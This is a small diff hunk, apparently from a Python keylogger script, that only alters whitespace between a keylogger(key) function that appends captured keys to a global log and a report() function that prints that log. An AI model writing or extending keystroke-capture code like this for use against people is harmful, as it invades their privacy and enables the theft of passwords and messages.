@@ -12,8 +12,7 @@ def keylogger(key):
             log = log + " "
         else:
             log = log + " " + str(key) + " "
-
-
+            
 def report():
     global log
     print(log)
